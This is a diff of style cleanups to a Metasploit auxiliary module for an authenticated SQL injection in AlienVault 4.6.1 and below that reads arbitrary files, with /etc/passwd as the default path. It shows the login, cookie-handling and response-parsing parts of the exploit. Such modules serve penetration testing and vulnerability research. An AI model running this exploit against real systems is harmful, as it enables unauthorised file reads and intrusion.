@@ -14,10 +14,9 @@ class Metasploit4 < Msf::Auxiliary
       'Name'           => "AlienVault Authenticated SQL Injection Arbitrary File Read",
       'Description'    => %q{
         AlienVault 4.6.1 and below is susceptible to an authenticated SQL injection attack against
-        newpolicyform.php using the 'insertinto' parameter.  This module exploits the
-        lack of input filtering to read an arbitrary file from the file system.
-        Any authenticated user is able to exploit this, as administrator
-        privileges are not required.
+        newpolicyform.php, using the 'insertinto' parameter. This module exploits the vulnerability
+        to read an arbitrary file from the file system. Any authenticated user is able to exploit
+        this, as administrator privileges are not required.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
@@ -26,9 +25,9 @@ class Metasploit4 < Msf::Auxiliary
         ],
       'References'     =>
         [
-          [ 'OSVDB', '106815' ],
-          [ 'EDB', '33317'],
-          [ 'URL', 'http://forums.alienvault.com/discussion/2690/security-advisories-v4-6-1-and-lower' ]
+          ['OSVDB', '106815'],
+          ['EDB', '33317'],
+          ['URL', 'http://forums.alienvault.com/discussion/2690/security-advisories-v4-6-1-and-lower']
         ],
       'DefaultOptions'  =>
         {
@@ -37,15 +36,13 @@ class Metasploit4 < Msf::Auxiliary
       'Privileged'     => false,
       'DisclosureDate' => "May 9 2014"))
 
-      register_options(
-      [
+      register_options([
         Opt::RPORT(443),
         OptString.new('FILEPATH', [ true, 'Path to remote file', '/etc/passwd' ]),
         OptString.new('USERNAME', [ true, 'Single username' ]),
         OptString.new('PASSWORD', [ true, 'Single password' ]),
         OptString.new('TARGETURI', [ true, 'Relative URI of installation', '/' ])
       ], self.class)
-
   end
 
   def run
@@ -55,7 +52,7 @@ class Metasploit4 < Msf::Auxiliary
       'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php')
     })
 
-    unless res and res.code == 200
+    unless res && res.code == 200
       print_error("#{peer} - Server did not respond in an expected way")
       return
     end
@@ -84,7 +81,7 @@ class Metasploit4 < Msf::Auxiliary
       'cookie' => cookie
     })
 
-    unless res and res.code == 302
+    unless res && res.code == 302
       print_error("#{peer} - Server did not respond in an expected way")
       return
     end
@@ -143,7 +140,7 @@ class Metasploit4 < Msf::Auxiliary
       'vars_get' => get
     })
 
-    if res and res.body and res.body =~ /#{left_marker}(.*)#{right_marker}/
+    if res && res.body && res.body =~ /#{left_marker}(.*)#{right_marker}/
       return $1
     else
       print_error("Server did not respond in an expected way")
